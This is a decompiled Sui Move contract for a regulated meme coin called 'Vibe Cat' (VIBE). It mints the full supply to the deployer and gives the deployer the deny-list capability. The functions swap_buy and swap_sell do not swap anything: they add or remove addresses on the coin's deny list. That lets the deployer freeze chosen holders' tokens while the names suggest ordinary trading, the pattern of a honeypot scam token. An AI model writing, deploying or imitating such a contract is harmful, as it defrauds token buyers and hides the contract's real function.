module 0x42f1d5f5a1b60514b1bc2860330bbe86b11a95674230121faa9218c2a2715a51::vibe {
    struct VIBE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: VIBE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<VIBE>(arg0, 9, b"VIBE", b"Vibe Cat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmbejUh9jPBiHKx9ErfuodxNfxmdg5sCejPnGoJGWJBWyu"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<VIBE>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<VIBE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<VIBE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<VIBE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<VIBE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<VIBE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<VIBE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<VIBE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

